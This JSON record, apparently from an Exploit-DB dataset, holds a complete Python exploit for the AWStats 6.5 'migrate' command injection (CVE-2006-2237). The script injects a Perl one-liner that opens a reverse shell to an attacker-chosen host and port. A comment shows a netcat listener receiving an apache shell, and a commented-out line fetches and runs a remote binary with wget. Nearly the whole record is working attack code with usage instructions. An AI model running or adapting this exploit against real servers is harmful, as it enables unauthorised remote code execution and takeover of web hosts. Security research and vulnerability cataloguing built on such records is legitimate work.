{
  "id": "1755",
  "title": "AWStats 6.5 - &#039;migrate&#039; Remote Shell Command Injection",
  "cve": "CVE-2006-2237",
  "vuln_type": "rce",
  "code": "#!/usr/bin/env python\r\n# http://secunia.com/advisories/19969/\r\n# by redsand@blacksecurity.org\r\n# May 5, 2006 - HAPPY CINCO DE MAYO\r\n# HAPPY BIRTHDAY DAD\r\n# private plz\r\n\r\n\r\n#\r\n# \tredsand@jinxy ~/ $ nc -l -p 31337 -v\r\n#\tlistening on [any] 31337 ...\r\n#\tconnect to [65.99.197.147] from blacksecurity.org [65.99.197.147] 53377\r\n#\tid\r\n#\tuid=81(apache) gid=81(apache) groups=81(apache)\r\n#\r\n\r\n\r\nimport sys, socket, base64\r\nimport urllib2, urlparse, urllib\r\n\r\n# perl 1 line tcp connect-back code\r\n# needs ip & port\r\ncmd = 'perl -e \\'$h=\"%s\";$p=%r;use Socket;$sp=inet_aton($h);$sa=sockaddr_in($p,$sp);;socket(CLIENT,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));gethostbyname($h);connect(CLIENT,$sa);open(STDIN,\">&CLIENT\");open(STDOUT,\">&CLIENT\");open(STDERR,\">&CLIENT\");if(fork()){exec \"/bin/sh\"; exit(0); };\\'';\r\n\r\nclass\trbawstatsMigrate:\r\n\t__url = '' \r\n\t__user = ''\r\n\t__password = ''\r\n\t__auth = False\r\n\t__chost =False\r\n\t__cport = False\r\n\t\r\n\tdef\t__init__(self,host=False, ur=False, ps=False, chost=False, cport=False):\r\n\t\tif host:\r\n\t\t\tself.__url = host\r\n\t\tif ur:\r\n\t\t\tself.__user = ur\r\n\t\tif ps:\t\r\n\t\t\tself.__password = ps\r\n\r\n\t\tif ur or ps:\tself.__auth = True\r\n\r\n\r\n\t\tif chost: self.__chost = chost\r\n\t\tif cport: self.__cport = cport\r\n\r\n\r\n\t\turl = urlparse.urlsplit(self.__url)\r\n\r\n\t\ti = url[1].find(';')\r\n\t\tif i >= 0:\r\n\t\t\tself.__parsed_host = url[1][:i]\r\n\t\telse:\r\n\t\t\tself.__parsed_host = url[1]\r\n\r\n\tdef\tprobe(self):\r\n\r\n\t\tcphost = socket.gethostbyname_ex(self.__chost)\r\n\r\n\t\tmy_cmd = cmd % (cphost[2][0],self.__cport)\r\n\t\turl_xpl = { \"config\": self.__parsed_host,\r\n\t\t\t    \"migrate\":\"|cd /tmp/ && %s|awstats052005.%s.txt\" % (my_cmd, self.__parsed_host)\r\n\t\t\t    # \"migrate\":\"|cd /tmp/ && wget %s && chmod 777 %s && /tmp/%s|awstats052005.%s.txt\" % (rsv, fname, fname, self.__parsed_host)\r\n\r\n\t\t\t  }\r\n\r\n\t\t#if self.__url[len(self.__url) -1] != '?':\r\n\t\t#\turl_xpl = '?' + url_xpl\r\n\r\n\t\turl = self.__url \r\n\t\turl_xpl =  urllib.urlencode(url_xpl)\r\n\r\n\t\ttry:\r\n\t\t\treq = urllib2.Request(url, url_xpl)\r\n\t\t\tif(self.__auth):\r\n\t\t\t\tb64str = base64.encodestring('%s:%s' % (self.__user,self.__password))[:-1]\r\n\t\t\t\treq.add_header('Authorization', \"Basic %s\"% b64str)\r\n\r\n\t\t\treq.add_header('Referer', \"http://exploit.by.redsand.of.blacksecurity.org\")\r\n\t\t\treq.add_header('Accept', 'text/xml,application/xml,application/xhtml+xml,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1')\r\n\t\t\treq.add_header('Accept-Language','en-us')\r\n\t\t\treq.add_header('Accept-Encoding','deflate, gzip')\r\n\t\t\treq.add_header('User-Agent', \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; [BL4CK] Security\")\r\n\t\t\treq.add_header('Connection' ,'Keep-Alive')\r\n\t\t\treq.add_header('Cache-Control','no-cache')\r\n\t\t\tq = urllib2.urlopen(req)\r\n\t\texcept IOError, e:\r\n\t\t\tprint \"FAILED %s\" % e\r\n\t\t\tsys.exit(0)\r\n\r\n\t\tprint \"SUCCESS, now check to see if it connected-back properly to %s:%s\" % (self.__chost,self.__cport)\r\n\t\tsys.exit(0)\r\n\t\t\r\n\r\n\t\t\r\n\t\t\t\r\nuser=False\r\npas=False\r\nurl=False\r\nchst=False\r\ncprt=False\r\n\r\nprint \"[BL4CK] AWStats CMD Injection Exploit by redsand@blacksecurity.org\"\r\nprint \"http://secunia.com/advisories/19969/\"\r\nprint \"http://blacksecurity.org - f0r my h0mi3s\"\r\n\r\nargc = len(sys.argv)\r\nif(argc <= 3):\r\n\tprint \"USAGE: %s http://host/awstats.pl <connect back host> <connect back port> [username] [password] \" % sys.argv[0]\r\n\tprint \"\\t\\* Support 401 HTTP Authentication\"\r\n\tsys.exit(0)\r\nif(argc > 1):\r\n\turl = sys.argv[1]\r\nif(argc > 2):\r\n\tchst = sys.argv[2]\r\nif(argc > 3):\r\n\tcprt = sys.argv[3]\r\nif(argc > 4):\r\n\tuser = sys.argv[4]\r\nif(argc > 5):\r\n\tpas = sys.argv[5]\r\n\r\n\r\n\r\n\r\n\t\t\r\nred = rbawstatsMigrate(url, user, pas, chst, cprt)\r\n\r\nred.probe()\r\n\r\n# milw0rm.com [2006-05-06]",
  "url": "https://www.exploit-db.com/exploits/1755"
}